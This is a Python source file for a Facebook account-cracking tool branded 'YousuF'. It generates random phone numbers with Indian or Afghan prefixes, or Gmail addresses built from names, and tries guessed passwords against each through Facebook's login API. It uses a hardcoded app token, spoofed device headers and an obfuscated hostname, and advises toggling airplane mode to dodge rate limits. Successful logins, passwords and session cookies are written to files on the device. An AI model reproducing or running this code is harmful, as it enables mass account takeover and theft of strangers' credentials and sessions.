    print(f'\33[1;37m\033[92;1m[\033[1;37mD\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-TEST\033[1;30m-\033[1;37m]  ')
    linex()
    mthdx=input(f'\033[92;1m[<+>]\033[1;37m SELECT METHOD :\033[92;1m ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with YousuFYousuF(max_workers=30) as YousuF:
        clear()
        tl = str(len(user))
        print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m RANDOM CLONE\33[1;37m [IND] ')
        linex()      
        print(f"\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m SIM CODE \33[1;33m ────────➤\33[1;37m {code} \033[1;37m")
        print(f"\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m TOTAL ACCOUNTS\33[1;33m ───➤\33[1;37m {tl}")
        print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m TRUN ON\033[91;1m AIRPLANE\x1b[1;92m MODE AFTER \033[1;37m4\x1b[1;92m MIN ')
        linex()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'57575751','57273200','59039200','57575751']
            ids = code+love
            if mthdx in ['A','1']:YousuF.submit(rnd1,ids,pwx,tl)            	
            if mthdx in ['B','2']:YousuF.submit(rnd2,ids,pwx,tl)          	
            if mthdx in ['C','3']:YousuF.submit(graph,ids,pwx,tl)            	
            if mthdx in ['D','4']:YousuF.submit(graph2,ids,pwx)                        	            
    print('\033[1;37m')
    linex()
    print(f'\33[1;37m\33[1;32m THE PROCESS HAS COMPLETED ')
    print(f'\33[1;37m\33[1;32m TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    linex()
    input(f'\33[1;37m\033[47m\033[1;30mPRESS ENTER TO BACK \033[40m\033[00m\033[1;37m ')
    YousuF()
#─━─━──━Random sys afg─━─━──━# 
def rndafg():
    user=[]
    twf =[]
    clear()
    print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m AFG SIM CODE : +9370 \33[1;37m-\33[1;32m +9378 \33[1;37m-\33[1;32m +9379 ')
    linex()
    code = input(f'\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m SELECT SIM CODE  : ')
    clear()
    print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m Example: \033[1;37m3000 \033[92;1m-\033[1;37m 5000 \033[92;1m-\033[1;37m 10000 \033[92;1m-\033[1;37m 20000\033[1;37m')
    linex()
    limit = int(input(f'\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m ENTER YOUR LIMIT : '))
    clear()
    print(f'\33[1;37m\033[92;1m[\033[1;37mA\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-FAST\033[1;30m-\033[1;37m]')
    print(f'\33[1;37m\033[92;1m[\033[1;37mB\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-BEST\033[1;30m-\033[1;37m] ')
    print(f'\33[1;37m\033[92;1m[\033[1;37mC\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-SLOW\033[1;30m-\033[1;37m]')
    print(f'\33[1;37m\033[92;1m[\033[1;37mD\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-TEST\033[1;30m-\033[1;37m]  ')
    linex()
    mthdx=input(f'\033[92;1m[<+>]\033[1;37m SELECT METHOD :\033[92;1m ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with YousuFYousuF(max_workers=30) as YousuF:
        clear()
        tl = str(len(user))
        print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m RANDOM CLONE\33[1;37m [AFG] ')
        linex()      
        print(f"\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m SIM CODE \33[1;33m ────────➤\33[1;37m {code} \033[1;37m")
        print(f"\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m TOTAL ACCOUNTS\33[1;33m ───➤\33[1;37m {tl}")
        print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m TRUN ON\033[91;1m AIRPLANE\x1b[1;92m MODE AFTER \033[1;37m4\x1b[1;92m MIN ')
        linex()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'708090','10002000','100200','700800','afghanistan','afghan1234','200300','500500','50006000','Afghan123','600700','afghan1122','afghan12345','kabul1234','۱۳۳۳۵۶۷۸۹','۱۳۳۳۵۶']
            ids = code+love
            if mthdx in ['A','1']:YousuF.submit(rnd1,ids,pwx,tl)            	
            if mthdx in ['B','2']:YousuF.submit(api2,ids,pwx,tl)          	
            if mthdx in ['C','3']:YousuF.submit(graph,ids,pwx,tl)            	
            if mthdx in ['D','4']:YousuF.submit(graph2,ids,pwx)                        	            
    print('\033[1;37m')
    linex()
    print(f'\33[1;37m\33[1;32m THE PROCESS HAS COMPLETED ')
    print(f'\33[1;37m\33[1;32m TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    linex()
    input(f'\33[1;37m\033[47m\033[1;30mPRESS ENTER TO BACK \033[40m\033[00m\033[1;37m ')
    YousuF()
#─━─━──━Random sys NEP─━─━──━# 
def rndnep():
    user=[]
    twf =[]
    clear()
    print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m AFG SIM CODE : +9370 \33[1;37m-\33[1;32m +9378 \33[1;37m-\33[1;32m +9379 ')
    linex()
    code = input(f'\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m SELECT SIM CODE  : ')
    clear()
    print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m Example: \033[1;37m3000 \033[92;1m-\033[1;37m 5000 \033[92;1m-\033[1;37m 10000 \033[92;1m-\033[1;37m 20000\033[1;37m')
    linex()
    limit = int(input(f'\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m ENTER YOUR LIMIT : '))
    clear()
    print(f'\33[1;37m\033[92;1m[\033[1;37mA\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-FAST\033[1;30m-\033[1;37m]')
    print(f'\33[1;37m\033[92;1m[\033[1;37mB\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-BEST\033[1;30m-\033[1;37m] ')
    print(f'\33[1;37m\033[92;1m[\033[1;37mC\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-SLOW\033[1;30m-\033[1;37m]')
    print(f'\33[1;37m\033[92;1m[\033[1;37mD\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-TEST\033[1;30m-\033[1;37m]  ')
    linex()
    mthdx=input(f'\033[92;1m[<+>]\033[1;37m SELECT METHOD :\033[92;1m ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with YousuFYousuF(max_workers=30) as YousuF:
        clear()
        tl = str(len(user))
        print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m RANDOM CLONE\33[1;37m [AFG] ')
        linex()      
        print(f"\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m SIM CODE \33[1;33m ────────➤\33[1;37m {code} \033[1;37m")
        print(f"\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m TOTAL ACCOUNTS\33[1;33m ───➤\33[1;37m {tl}")
        print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m TRUN ON\033[91;1m AIRPLANE\x1b[1;92m MODE AFTER \033[1;37m4\x1b[1;92m MIN ')
        linex()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'708090','10002000','100200','700800','afghanistan','afghan1234','200300','500500','50006000','Afghan123','600700','afghan1122','afghan12345','kabul1234','۱۳۳۳۵۶۷۸۹','۱۳۳۳۵۶']
            ids = code+love
            if mthdx in ['A','1']:YousuF.submit(rnd1,ids,pwx,tl)            	
            if mthdx in ['B','2']:YousuF.submit(api2,ids,pwx,tl)          	
            if mthdx in ['C','3']:YousuF.submit(graph,ids,pwx,tl)            	
            if mthdx in ['D','4']:YousuF.submit(graph2,ids,pwx)                        	            
    print('\033[1;37m')
    linex()
    print(f'\33[1;37m\33[1;32m THE PROCESS HAS COMPLETED ')
    print(f'\33[1;37m\33[1;32m TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    linex()
    input(f'\33[1;37m\033[47m\033[1;30mPRESS ENTER TO BACK \033[40m\033[00m\033[1;37m ')
    YousuF()    
#─━─━─━─━Gmail sys─━─━─━─━─#
def gmail():
    user=[]
    clear()
    print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m Example:\033[1;37m yousuf \033[92;1m-\033[1;37m maliha \033[92;1m-\033[1;37m arafat  \033[1;97m')
    linex()
    first=input('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m ENTER FIRST NAME : ')
    linex()
    print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m Example:\033[1;37m ali \033[92;1m-\033[1;37m akhter \033[92;1m-\033[1;37m hossain  \033[1;97m')
    linex()
    last=input('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m ENTER LAST NAME : ')
    domain = "@gmail.com"
    clear()
    print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m Example: \033[1;37m3000 \033[92;1m-\033[1;37m 5000 \033[92;1m-\033[1;37m 10000 \033[92;1m-\033[1;37m 20000\033[1;37m')
    linex()
    try:
        limit=int(input('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m ENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with YousuFYousuF(max_workers=30) as YousuF:
        tl=str(len(user))
        clear()
        print(f"\33[1;37m\33[1;32mTOTAL ACCOUNTS\33[1;33m ───➤\33[1;37m" +tl )
        print('\33[1;37m\33[1;32mTRUN ON\033[91;1m AIRPLANE\x1b[1;92m MODE AFTER \033[1;37m4\x1b[1;92m MIN ')
        linex()
        for digitx in user:
            ids=first+last+digitx+domain
            passlist=[first+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234']
            YousuF.submit(rndi1,ids,passlist)
    print('\033[1;37m')
    linex()
    print('\33[1;37m\33[1;32m THE PROCESS HAS COMPLETED ')
    print(f'\33[1;37m\33[1;32m TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    linex()
    input(f'\33[1;37m\033[47m\033[1;30mPRESS ENTER TO BACK ')
    YousuF()
#─━─━─━─rndom-m1━─━─━─━─#
def rnd1(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r\33[1;37m\33[1;37m[YousuF]\033[1;37m-\33[1;32m[M\033[1;37m1\33[1;32m]\033[1;37m<>\33[1;32m [{loop}\033[1;37m/\33[1;32m{tl}] \033[1;37m<>\33[1;32mOK \033[1;37m: \033[1;32m{len(oks)}');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'ko_KR',
                    'client_country_code': 'KR',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent':fuckua(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://gr'+'ap'+'h'+'.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\33[1;37m[YousuF]-[OK]\33[1;37m '+ids+' \033[1;30m|\033[1;32m '+pas+'\33[1;37m')
                print(f'\r\33[1;37m[CookiE]-[OK]\33[1;32m '+kuki+'')
                linex()
                open('/sdcard/YousuF/YousuF-RANDOM-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
            	#print(ids,pas)

        loop+=1
    except Exception as e:
        pass
#─━─━─━─rndom-m2━─━─━─━─#
def rnd2(ids,pwv,tl):
    global loop,oks,cps,twf
    sys.stdout.write(f'\r\33[1;37m\33[1;37m[YousuF]\033[1;37m-\33[1;32m[M\033[1;37m2\33[1;32m]\033[1;37m<>\33[1;32m [%s\033[1;37m/\33[1;32m{tl}] \033[1;37m<>\33[1;32mOK \033[1;37m:\033[1;32m %s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    try:
        for pas in pwv:
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent': fuckua(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\033[1;32m[YousuF]-[OK] '+ids+' | '+pas+'\033[1;92m')
               # print("\r\r\033[1;34m[ðŸª\033[1;34m]\033[1;32m :\033[1;37m {kuki}")
                oks.append(ids)
                open('//sdcard/YousuF/YousuF-rnd--OK.txt','a').write(ids+' | '+pas+'\n')
                open('/sdcard/YousuF/YousuF-rnd--COOKIE','a').write(ids+' | '+pas+' | '+kuki+'\n')
                break
            elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        ids = po['error']['error_data']['uid']
                                except:
                                        ids = ids
                                if ids in oks:pass
                                else:
                                        print('\r\r\033[1;30m[YousuF]-[CP] \033[1;30m'+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/YousuF/YousuF-rnd-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
            else:continue
            	#print(ids,pas)
#continue
        loop+=1
    except Exception as e:
        pass
if __name__=="__main__":
    os.system('clear')
    YousuF()        
else:
    YousuF()